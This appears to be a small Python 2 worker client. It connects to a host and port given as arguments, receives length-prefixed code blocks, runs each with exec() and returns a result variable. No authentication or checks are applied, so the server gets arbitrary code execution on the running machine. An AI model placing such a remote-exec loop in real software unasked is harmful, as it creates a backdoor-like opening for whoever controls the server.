import socket
import sys

dbg_lvl = 1

def dbg(s) :
        global dbg_lvl
        if dbg_lvl > 3 : print ''.join(s) 

def so_write_block(so, s) :
	t = str(len(s)) + '\n' + s
	dbg(('<=', t))
	so.send(t)

def so_read_block(so) :
	# read length
	s = ''
	t = so.recv(1)
	while (t and t != '\n') :
		s = s + t
		t = so.recv(1)
	try :
		lblk = long(s)
	except :
		lblk = 0
	
	# if nothing to read, quit
	if lblk == 0 : return ''

 	# read payload
	blk = so.recv(lblk)
	dbg(('=>', s, '\n', blk))
	return blk
 
host = sys.argv[1]
port = long(sys.argv[2])

so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
so.connect((host, port))
while 1 :
	task = so_read_block(so)
	
	if task == '' : break
	
	# clear result
	result = ''
 	
	# execute payload
	#try :
	exec(task)
	#except :
    # print "Failed to run task"
		
	# return result
	so_write_block(so, result)

so.close()
 
